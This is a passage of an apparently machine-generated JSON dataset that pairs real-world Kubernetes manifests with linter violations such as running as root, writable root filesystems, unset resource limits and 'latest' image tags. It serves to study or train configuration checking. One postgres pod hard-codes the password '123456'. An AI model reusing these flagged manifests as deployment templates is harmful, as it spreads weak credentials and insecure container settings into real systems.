    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crapi-community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crapi-community\n  template:\n    metadata:\n      labels:\n        app: crapi-community\n    spec:\n      initContainers:\n      - name: wait-for-postgres\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - postgresdb\n      - name: wait-for-mongo\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - mongodb\n      - name: wait-for-java\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - crapi-identity\n      containers:\n      - name: crapi-community\n        image: crapi/crapi-community:v1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8087\n        envFrom:\n        - configMapRef:\n            name: crapi-community-configmap\n        resources:\n          limits:\n            cpu: 500m\n          requests:\n            cpu: 256m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"crapi-community\" does not have a read-only root file system"
  },
  {
    "id": "2904",
    "manifest_path": "data/manifests/the_stack_sample/sample_0831.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crapi-community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crapi-community\n  template:\n    metadata:\n      labels:\n        app: crapi-community\n    spec:\n      initContainers:\n      - name: wait-for-postgres\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - postgresdb\n      - name: wait-for-mongo\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - mongodb\n      - name: wait-for-java\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - crapi-identity\n      containers:\n      - name: crapi-community\n        image: crapi/crapi-community:v1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8087\n        envFrom:\n        - configMapRef:\n            name: crapi-community-configmap\n        resources:\n          limits:\n            cpu: 500m\n          requests:\n            cpu: 256m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"wait-for-java\" does not have a read-only root file system"
  },
  {
    "id": "2905",
    "manifest_path": "data/manifests/the_stack_sample/sample_0831.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crapi-community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crapi-community\n  template:\n    metadata:\n      labels:\n        app: crapi-community\n    spec:\n      initContainers:\n      - name: wait-for-postgres\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - postgresdb\n      - name: wait-for-mongo\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - mongodb\n      - name: wait-for-java\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - crapi-identity\n      containers:\n      - name: crapi-community\n        image: crapi/crapi-community:v1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8087\n        envFrom:\n        - configMapRef:\n            name: crapi-community-configmap\n        resources:\n          limits:\n            cpu: 500m\n          requests:\n            cpu: 256m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"wait-for-mongo\" does not have a read-only root file system"
  },
  {
    "id": "2906",
    "manifest_path": "data/manifests/the_stack_sample/sample_0831.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crapi-community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crapi-community\n  template:\n    metadata:\n      labels:\n        app: crapi-community\n    spec:\n      initContainers:\n      - name: wait-for-postgres\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - postgresdb\n      - name: wait-for-mongo\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - mongodb\n      - name: wait-for-java\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - crapi-identity\n      containers:\n      - name: crapi-community\n        image: crapi/crapi-community:v1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8087\n        envFrom:\n        - configMapRef:\n            name: crapi-community-configmap\n        resources:\n          limits:\n            cpu: 500m\n          requests:\n            cpu: 256m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"wait-for-postgres\" does not have a read-only root file system"
  },
  {
    "id": "2907",
    "manifest_path": "data/manifests/the_stack_sample/sample_0831.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crapi-community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crapi-community\n  template:\n    metadata:\n      labels:\n        app: crapi-community\n    spec:\n      initContainers:\n      - name: wait-for-postgres\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - postgresdb\n      - name: wait-for-mongo\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - mongodb\n      - name: wait-for-java\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - crapi-identity\n      containers:\n      - name: crapi-community\n        image: crapi/crapi-community:v1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8087\n        envFrom:\n        - configMapRef:\n            name: crapi-community-configmap\n        resources:\n          limits:\n            cpu: 500m\n          requests:\n            cpu: 256m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"crapi-community\" is not set to runAsNonRoot"
  },
  {
    "id": "2908",
    "manifest_path": "data/manifests/the_stack_sample/sample_0831.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crapi-community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crapi-community\n  template:\n    metadata:\n      labels:\n        app: crapi-community\n    spec:\n      initContainers:\n      - name: wait-for-postgres\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - postgresdb\n      - name: wait-for-mongo\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - mongodb\n      - name: wait-for-java\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - crapi-identity\n      containers:\n      - name: crapi-community\n        image: crapi/crapi-community:v1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8087\n        envFrom:\n        - configMapRef:\n            name: crapi-community-configmap\n        resources:\n          limits:\n            cpu: 500m\n          requests:\n            cpu: 256m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"wait-for-java\" is not set to runAsNonRoot"
  },
  {
    "id": "2909",
    "manifest_path": "data/manifests/the_stack_sample/sample_0831.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crapi-community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crapi-community\n  template:\n    metadata:\n      labels:\n        app: crapi-community\n    spec:\n      initContainers:\n      - name: wait-for-postgres\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - postgresdb\n      - name: wait-for-mongo\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - mongodb\n      - name: wait-for-java\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - crapi-identity\n      containers:\n      - name: crapi-community\n        image: crapi/crapi-community:v1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8087\n        envFrom:\n        - configMapRef:\n            name: crapi-community-configmap\n        resources:\n          limits:\n            cpu: 500m\n          requests:\n            cpu: 256m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"wait-for-mongo\" is not set to runAsNonRoot"
  },
  {
    "id": "2910",
    "manifest_path": "data/manifests/the_stack_sample/sample_0831.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crapi-community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crapi-community\n  template:\n    metadata:\n      labels:\n        app: crapi-community\n    spec:\n      initContainers:\n      - name: wait-for-postgres\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - postgresdb\n      - name: wait-for-mongo\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - mongodb\n      - name: wait-for-java\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - crapi-identity\n      containers:\n      - name: crapi-community\n        image: crapi/crapi-community:v1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8087\n        envFrom:\n        - configMapRef:\n            name: crapi-community-configmap\n        resources:\n          limits:\n            cpu: 500m\n          requests:\n            cpu: 256m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"wait-for-postgres\" is not set to runAsNonRoot"
  },
  {
    "id": "2911",
    "manifest_path": "data/manifests/the_stack_sample/sample_0831.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crapi-community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crapi-community\n  template:\n    metadata:\n      labels:\n        app: crapi-community\n    spec:\n      initContainers:\n      - name: wait-for-postgres\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - postgresdb\n      - name: wait-for-mongo\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - mongodb\n      - name: wait-for-java\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - crapi-identity\n      containers:\n      - name: crapi-community\n        image: crapi/crapi-community:v1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8087\n        envFrom:\n        - configMapRef:\n            name: crapi-community-configmap\n        resources:\n          limits:\n            cpu: 500m\n          requests:\n            cpu: 256m\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"wait-for-java\" has cpu request 0"
  },
  {
    "id": "2912",
    "manifest_path": "data/manifests/the_stack_sample/sample_0831.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crapi-community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crapi-community\n  template:\n    metadata:\n      labels:\n        app: crapi-community\n    spec:\n      initContainers:\n      - name: wait-for-postgres\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - postgresdb\n      - name: wait-for-mongo\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - mongodb\n      - name: wait-for-java\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - crapi-identity\n      containers:\n      - name: crapi-community\n        image: crapi/crapi-community:v1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8087\n        envFrom:\n        - configMapRef:\n            name: crapi-community-configmap\n        resources:\n          limits:\n            cpu: 500m\n          requests:\n            cpu: 256m\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"wait-for-mongo\" has cpu request 0"
  },
  {
    "id": "2913",
    "manifest_path": "data/manifests/the_stack_sample/sample_0831.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crapi-community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crapi-community\n  template:\n    metadata:\n      labels:\n        app: crapi-community\n    spec:\n      initContainers:\n      - name: wait-for-postgres\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - postgresdb\n      - name: wait-for-mongo\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - mongodb\n      - name: wait-for-java\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - crapi-identity\n      containers:\n      - name: crapi-community\n        image: crapi/crapi-community:v1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8087\n        envFrom:\n        - configMapRef:\n            name: crapi-community-configmap\n        resources:\n          limits:\n            cpu: 500m\n          requests:\n            cpu: 256m\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"wait-for-postgres\" has cpu request 0"
  },
  {
    "id": "2914",
    "manifest_path": "data/manifests/the_stack_sample/sample_0831.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crapi-community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crapi-community\n  template:\n    metadata:\n      labels:\n        app: crapi-community\n    spec:\n      initContainers:\n      - name: wait-for-postgres\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - postgresdb\n      - name: wait-for-mongo\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - mongodb\n      - name: wait-for-java\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - crapi-identity\n      containers:\n      - name: crapi-community\n        image: crapi/crapi-community:v1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8087\n        envFrom:\n        - configMapRef:\n            name: crapi-community-configmap\n        resources:\n          limits:\n            cpu: 500m\n          requests:\n            cpu: 256m\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"crapi-community\" has memory limit 0"
  },
  {
    "id": "2915",
    "manifest_path": "data/manifests/the_stack_sample/sample_0831.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crapi-community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crapi-community\n  template:\n    metadata:\n      labels:\n        app: crapi-community\n    spec:\n      initContainers:\n      - name: wait-for-postgres\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - postgresdb\n      - name: wait-for-mongo\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - mongodb\n      - name: wait-for-java\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - crapi-identity\n      containers:\n      - name: crapi-community\n        image: crapi/crapi-community:v1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8087\n        envFrom:\n        - configMapRef:\n            name: crapi-community-configmap\n        resources:\n          limits:\n            cpu: 500m\n          requests:\n            cpu: 256m\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"wait-for-java\" has memory limit 0"
  },
  {
    "id": "2916",
    "manifest_path": "data/manifests/the_stack_sample/sample_0831.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crapi-community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crapi-community\n  template:\n    metadata:\n      labels:\n        app: crapi-community\n    spec:\n      initContainers:\n      - name: wait-for-postgres\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - postgresdb\n      - name: wait-for-mongo\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - mongodb\n      - name: wait-for-java\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - crapi-identity\n      containers:\n      - name: crapi-community\n        image: crapi/crapi-community:v1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8087\n        envFrom:\n        - configMapRef:\n            name: crapi-community-configmap\n        resources:\n          limits:\n            cpu: 500m\n          requests:\n            cpu: 256m\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"wait-for-mongo\" has memory limit 0"
  },
  {
    "id": "2917",
    "manifest_path": "data/manifests/the_stack_sample/sample_0831.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crapi-community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crapi-community\n  template:\n    metadata:\n      labels:\n        app: crapi-community\n    spec:\n      initContainers:\n      - name: wait-for-postgres\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - postgresdb\n      - name: wait-for-mongo\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - mongodb\n      - name: wait-for-java\n        image: groundnuty/k8s-wait-for:v1.3\n        imagePullPolicy: Always\n        args:\n        - service\n        - crapi-identity\n      containers:\n      - name: crapi-community\n        image: crapi/crapi-community:v1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8087\n        envFrom:\n        - configMapRef:\n            name: crapi-community-configmap\n        resources:\n          limits:\n            cpu: 500m\n          requests:\n            cpu: 256m\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"wait-for-postgres\" has memory limit 0"
  },
  {
    "id": "2918",
    "manifest_path": "data/manifests/the_stack_sample/sample_0833.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: helloworld-gke\n  labels:\n    app: hello\nspec:\n  replicas: 5\n  selector:\n    matchLabels:\n      app: hello\n  template:\n    metadata:\n      labels:\n        app: hello\n    spec:\n      containers:\n      - name: helloworld-gke\n        image: gcr.io/kpt-dev/helloworld-gke:0.1.0\n        ports:\n        - name: http\n          containerPort: 80\n        env:\n        - name: PORT\n          value: '80'\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 5 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2919",
    "manifest_path": "data/manifests/the_stack_sample/sample_0833.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: helloworld-gke\n  labels:\n    app: hello\nspec:\n  replicas: 5\n  selector:\n    matchLabels:\n      app: hello\n  template:\n    metadata:\n      labels:\n        app: hello\n    spec:\n      containers:\n      - name: helloworld-gke\n        image: gcr.io/kpt-dev/helloworld-gke:0.1.0\n        ports:\n        - name: http\n          containerPort: 80\n        env:\n        - name: PORT\n          value: '80'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"helloworld-gke\" does not have a read-only root file system"
  },
  {
    "id": "2920",
    "manifest_path": "data/manifests/the_stack_sample/sample_0833.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: helloworld-gke\n  labels:\n    app: hello\nspec:\n  replicas: 5\n  selector:\n    matchLabels:\n      app: hello\n  template:\n    metadata:\n      labels:\n        app: hello\n    spec:\n      containers:\n      - name: helloworld-gke\n        image: gcr.io/kpt-dev/helloworld-gke:0.1.0\n        ports:\n        - name: http\n          containerPort: 80\n        env:\n        - name: PORT\n          value: '80'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"helloworld-gke\" is not set to runAsNonRoot"
  },
  {
    "id": "2921",
    "manifest_path": "data/manifests/the_stack_sample/sample_0833.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: helloworld-gke\n  labels:\n    app: hello\nspec:\n  replicas: 5\n  selector:\n    matchLabels:\n      app: hello\n  template:\n    metadata:\n      labels:\n        app: hello\n    spec:\n      containers:\n      - name: helloworld-gke\n        image: gcr.io/kpt-dev/helloworld-gke:0.1.0\n        ports:\n        - name: http\n          containerPort: 80\n        env:\n        - name: PORT\n          value: '80'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"helloworld-gke\" has cpu request 0"
  },
  {
    "id": "2922",
    "manifest_path": "data/manifests/the_stack_sample/sample_0833.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: helloworld-gke\n  labels:\n    app: hello\nspec:\n  replicas: 5\n  selector:\n    matchLabels:\n      app: hello\n  template:\n    metadata:\n      labels:\n        app: hello\n    spec:\n      containers:\n      - name: helloworld-gke\n        image: gcr.io/kpt-dev/helloworld-gke:0.1.0\n        ports:\n        - name: http\n          containerPort: 80\n        env:\n        - name: PORT\n          value: '80'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"helloworld-gke\" has memory limit 0"
  },
  {
    "id": "2923",
    "manifest_path": "data/manifests/the_stack_sample/sample_0835.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: catalogue\n  labels:\n    name: catalogue\nspec:\n  ports:\n  - port: 80\n    targetPort: 80\n  selector:\n    name: catalogue\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:catalogue])"
  },
  {
    "id": "2924",
    "manifest_path": "data/manifests/the_stack_sample/sample_0837.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: web\n  namespace: basic-ingress\nspec:\n  ports:\n  - port: 8080\n    protocol: TCP\n    targetPort: 8080\n  selector:\n    run: web\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[run:web])"
  },
  {
    "id": "2925",
    "manifest_path": "data/manifests/the_stack_sample/sample_0838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\n    tier: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      tier: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n        tier: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: izhur85/pay-msdemo:v0.0.2\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2926",
    "manifest_path": "data/manifests/the_stack_sample/sample_0838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\n    tier: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      tier: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n        tier: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: izhur85/pay-msdemo:v0.0.2\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "2927",
    "manifest_path": "data/manifests/the_stack_sample/sample_0838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\n    tier: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      tier: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n        tier: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: izhur85/pay-msdemo:v0.0.2\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "2928",
    "manifest_path": "data/manifests/the_stack_sample/sample_0838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\n    tier: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      tier: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n        tier: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: izhur85/pay-msdemo:v0.0.2\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "2929",
    "manifest_path": "data/manifests/the_stack_sample/sample_0838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\n    tier: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      tier: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n        tier: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: izhur85/pay-msdemo:v0.0.2\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "2930",
    "manifest_path": "data/manifests/the_stack_sample/sample_0840.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: postgres\n  namespace: nestjs-app\n  labels:\n    application: postgres-pod\nspec:\n  containers:\n  - name: postgres\n    image: postgres\n    env:\n    - name: POSTGRES_PASSWORD\n      value: '123456'\n    ports:\n    - name: web\n      containerPort: 5432\n      protocol: TCP\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"postgres\" is using an invalid container image, \"postgres\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2931",
    "manifest_path": "data/manifests/the_stack_sample/sample_0840.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: postgres\n  namespace: nestjs-app\n  labels:\n    application: postgres-pod\nspec:\n  containers:\n  - name: postgres\n    image: postgres\n    env:\n    - name: POSTGRES_PASSWORD\n      value: '123456'\n    ports:\n    - name: web\n      containerPort: 5432\n      protocol: TCP\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"postgres\" does not have a read-only root file system"
  },
  {
    "id": "2932",
    "manifest_path": "data/manifests/the_stack_sample/sample_0840.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: postgres\n  namespace: nestjs-app\n  labels:\n    application: postgres-pod\nspec:\n  containers:\n  - name: postgres\n    image: postgres\n    env:\n    - name: POSTGRES_PASSWORD\n      value: '123456'\n    ports:\n    - name: web\n      containerPort: 5432\n      protocol: TCP\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"postgres\" is not set to runAsNonRoot"
  },
  {
    "id": "2933",
    "manifest_path": "data/manifests/the_stack_sample/sample_0840.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: postgres\n  namespace: nestjs-app\n  labels:\n    application: postgres-pod\nspec:\n  containers:\n  - name: postgres\n    image: postgres\n    env:\n    - name: POSTGRES_PASSWORD\n      value: '123456'\n    ports:\n    - name: web\n      containerPort: 5432\n      protocol: TCP\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"postgres\" has cpu request 0"
  },
  {
    "id": "2934",
    "manifest_path": "data/manifests/the_stack_sample/sample_0840.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: postgres\n  namespace: nestjs-app\n  labels:\n    application: postgres-pod\nspec:\n  containers:\n  - name: postgres\n    image: postgres\n    env:\n    - name: POSTGRES_PASSWORD\n      value: '123456'\n    ports:\n    - name: web\n      containerPort: 5432\n      protocol: TCP\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"postgres\" has memory limit 0"
  },
  {
    "id": "2935",
    "manifest_path": "data/manifests/the_stack_sample/sample_0842.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: atlasmap-operator\n  labels:\n    control-plane: controller-manager\nspec:\n  selector:\n    matchLabels:\n      control-plane: controller-manager\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        control-plane: controller-manager\n    spec:\n      securityContext:\n        runAsNonRoot: true\n      containers:\n      - command:\n        - /manager\n        args:\n        - --leader-elect\n        image: controller:latest\n        name: manager\n        securityContext:\n          allowPrivilegeEscalation: false\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        resources:\n          limits:\n            cpu: 200m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n      serviceAccountName: atlasmap-operator\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"manager\" is using an invalid container image, \"controller:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2936",
    "manifest_path": "data/manifests/the_stack_sample/sample_0842.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: atlasmap-operator\n  labels:\n    control-plane: controller-manager\nspec:\n  selector:\n    matchLabels:\n      control-plane: controller-manager\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        control-plane: controller-manager\n    spec:\n      securityContext:\n        runAsNonRoot: true\n      containers:\n      - command:\n        - /manager\n        args:\n        - --leader-elect\n        image: controller:latest\n        name: manager\n        securityContext:\n          allowPrivilegeEscalation: false\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        resources:\n          limits:\n            cpu: 200m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n      serviceAccountName: atlasmap-operator\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"manager\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "2937",
    "manifest_path": "data/manifests/the_stack_sample/sample_0842.yaml",
